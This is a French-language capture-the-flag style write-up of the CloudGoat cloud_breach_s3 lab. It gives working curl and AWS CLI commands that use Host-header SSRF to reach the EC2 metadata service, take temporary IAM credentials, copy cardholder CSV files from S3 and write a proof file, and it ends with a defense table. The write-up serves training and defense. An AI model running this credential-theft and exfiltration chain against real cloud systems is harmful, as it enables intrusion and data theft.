# Write-up — CloudGoat : Cloud Breach S3

> **CloudGoat · Rhino Security Labs · Pilier 2 — Cloud Offensif AWS**
> Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · 2026

[![AWS S3](https://img.shields.io/badge/AWS-S3%20FullAccess-orange.svg)](https://aws.amazon.com/s3/)
[![SSRF](https://img.shields.io/badge/SSRF-Host%20Header-red.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Vulnérabilité :** SSRF via manipulation du header `Host` → EC2 Metadata Service → credentials IAM temporaires → S3FullAccess  
**Point de départ :** EC2 exposée publiquement avec proxy HTTP sans restriction  
**Impact :** Lecture + écriture sur bucket contenant des données bancaires (SSN, mots de passe en clair)  
**Technique :** Host header SSRF → IMDS 169.254.169.254 → rôle `cg-banking-WAF-Role`

---

## 2. Surface d'attaque

**Seule information initiale :** IP de l'EC2 cible (`100.53.246.10`)

```bash
curl http://100.53.246.10/
# → "This server is configured to proxy requests to the EC2 metadata service.
#    Please modify your request's 'host' header and try again."
```

Le serveur révèle lui-même sa vulnérabilité : il proxifie les requêtes vers l'IMDS selon le header `Host`.

---

## 3. Chaîne d'exploitation

```
EC2 publique (proxy HTTP)
  │
  ├─ SSRF via Host: 169.254.169.254
  ├─ IMDS → liste des rôles IAM → cg-banking-WAF-Role
  ├─ IMDS → credentials temporaires (AccessKeyId + SecretAccessKey + Token)
  │
  ├─ aws s3 ls → bucket cg-cardholder-data-bucket
  ├─ aws s3 cp → lecture cardholder_data_primary.csv (SSN, PII)
  ├─ aws s3 cp → lecture cardholders_corporate.csv (SSN + passwords en clair)
  └─ aws s3 cp poc.txt → écriture confirmée (tamper de données)
```

---

## 4. Payload — Commandes clés

**Étape 1 — SSRF vers l'IMDS via Host header :**

```bash
curl http://100.53.246.10/ -H "Host: 169.254.169.254"
# → liste des versions API IMDS (1.0, 2007-01-19 ... latest)
```

> Screenshot : [docs/cb_s3_level1_ssrf_imds.png](docs/cb_s3_level1_ssrf_imds.png)

**Étape 2 — Récupération du nom du rôle IAM :**

```bash
curl http://100.53.246.10/latest/meta-data/iam/security-credentials/ -H "Host: 169.254.169.254"
# → cg-banking-WAF-Role-cgidxkn9zl53i2
```

**Étape 3 — Vol des credentials temporaires :**

```bash
curl http://100.53.246.10/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidxkn9zl53i2 \
  -H "Host: 169.254.169.254"
# → AccessKeyId ASIA... + SecretAccessKey + Token (expiration ~6h)
```

**Étape 4 — Configuration du profil AWS et listing des buckets :**

```bash
aws configure set aws_access_key_id ASIA... --profile breach
aws configure set aws_secret_access_key <secret> --profile breach
aws configure set aws_session_token <token> --profile breach

aws s3 ls --profile breach
# → cg-cardholder-data-bucket-cgidxkn9zl53i2
```

> Screenshot : [docs/cb_s3_level2_bucket_found.png](docs/cb_s3_level2_bucket_found.png)

**Étape 5 — Exfiltration des données bancaires :**

```bash
aws s3 ls s3://cg-cardholder-data-bucket-cgidxkn9zl53i2 --profile breach
# → cardholder_data_primary.csv (58 KB)
# → cardholder_data_secondary.csv (59 KB)
# → cardholders_corporate.csv (92 KB)

aws s3 cp s3://cg-cardholder-data-bucket-cgidxkn9zl53i2/cardholders_corporate.csv - \
  --profile breach | head -5
# → id, SSN, Corporate Account, first_name, last_name, password, email...
# → 387-31-4447, Skyba, Earle, Gathwaite, A53nIB6g, ...  ← passwords en clair
```

> Screenshot : [docs/cb_s3_level3_data_exfil.png](docs/cb_s3_level3_data_exfil.png)

**Étape 6 — Preuve d'écriture (impact maximal) :**

```bash
echo "PWNED by AngeVirus" > /tmp/poc.txt
aws s3 cp /tmp/poc.txt s3://cg-cardholder-data-bucket-cgidxkn9zl53i2/poc.txt --profile breach
# → upload: ../../../tmp/poc.txt to s3://cg-cardholder-data-bucket-...

aws sts get-caller-identity --profile breach
# → assumed-role/cg-banking-WAF-Role-cgidxkn9zl53i2/i-09f017fdc59d51989
```

> Screenshot : [docs/cb_s3_level4_write_access.png](docs/cb_s3_level4_write_access.png)

---

## 5. Périmètre du rôle compromis

| Permission | Résultat |
| --- | --- |
| `s3:ListBucket` | ✅ — tous les buckets du compte |
| `s3:GetObject` | ✅ — lecture complète des données bancaires |
| `s3:PutObject` | ✅ — écriture/tamper confirmé |
| `ec2:DescribeInstances` | ❌ — rôle limité à S3 |
| Escalade IAM | ❌ — pas de permissions IAM |

---

## 6. Défense

| Risque | Mesure |
| --- | --- |
| **SSRF via Host header** | Valider et restreindre les headers côté proxy — bloquer les IPs privées et 169.254.0.0/16 |
| **IMDSv1 exploitable** | Forcer **IMDSv2** sur toutes les instances EC2 — requiert un token PUT avant GET |
| **S3FullAccess sur rôle EC2** | Principe du moindre privilège — donner uniquement les permissions S3 nécessaires |
| **Données sensibles en clair** | Chiffrement côté serveur (SSE-S3 ou SSE-KMS) + pas de mots de passe en clair dans S3 |
| **Pas de détection** | Activer CloudTrail + alertes sur `GetCredentials` IMDS + accès anormaux S3 |

---

## 7. Reproductibilité

```
1. cloudgoat create cloud_breach_s3 --profile default
2. Récupérer l'IP EC2 dans start.txt
3. SSRF : curl http://<EC2_IP>/ -H "Host: 169.254.169.254"
4. Récupérer rôle + credentials via IMDS
5. Configurer profil AWS breach avec les credentials
6. aws s3 ls → identifier le bucket cardholder data
7. Exfiltrer les fichiers CSV (SSN, passwords)
8. Prouver l'écriture avec s3 cp poc.txt
9. cloudgoat destroy cloud_breach_s3 --profile default
```

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Scénario | CloudGoat cloud_breach_s3 |
| Vecteur initial | SSRF via HTTP Host header → proxy EC2 |
| Service exploité | EC2 Instance Metadata Service (IMDSv1) |
| Rôle IAM volé | `cg-banking-WAF-Role` |
| Credentials | Temporaires STS (~6h) |
| Données exfiltrées | SSN + mots de passe en clair (3 fichiers CSV) |
| Impact | Lecture + écriture S3 — violation PCI-DSS / RGPD |

---

*Ngagne Demba Dia · AngeVirusLab · Shadow Bytes Red Team · UCAD · Dakar, 2026*
